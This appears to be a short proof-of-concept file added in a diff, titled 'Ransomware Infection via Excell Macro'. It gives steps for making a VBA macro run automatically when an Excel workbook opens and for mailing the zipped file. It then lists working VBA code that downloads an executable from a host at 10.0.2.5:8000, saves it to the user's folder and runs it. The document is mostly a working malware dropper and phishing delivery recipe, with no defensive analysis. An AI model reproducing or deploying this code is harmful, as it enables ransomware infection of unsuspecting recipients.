@@ -1,0 +1,33 @@
+Ransomware Infection via Excell Macro
+
+PoC
+1. Open XLSM file
+2. Save the below VBA codes under macros section as a module
+3. Open the workbook object from same window
+4. Set the Open function that it will start the below code
+5. Save it. Then, when you open it, it will start automatically
+6. ZIP it. After that, send via mail
+
+Sub DownloadFile()
+    MsgBox "It's Begun"
+    Dim myURL As String
+    myURL = "http://10.0.2.5:8000/aptal.exe"
+    
+    Dim WinHttpReq As Object
+    Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
+    WinHttpReq.Open "GET", myURL, False, "username", "password"
+    WinHttpReq.send
+    
+    If WinHttpReq.Status = 200 Then
+        Set oStream = CreateObject("ADODB.Stream")
+        oStream.Open
+        oStream.Type = 1
+        oStream.Write WinHttpReq.responseBody
+        oStream.SaveToFile "C:\Users\rnsm\aptal.exe", 2 ' 1 = no overwrite, 2 = overwrite
+        oStream.Close
+    End If
+
+    strRoboappPath = "C:\Users\rnsm\aptal.exe" 'Your path here
+    varProc = Shell(strRoboappPath, 1)
+    MsgBox "It's Finished"
+End Sub
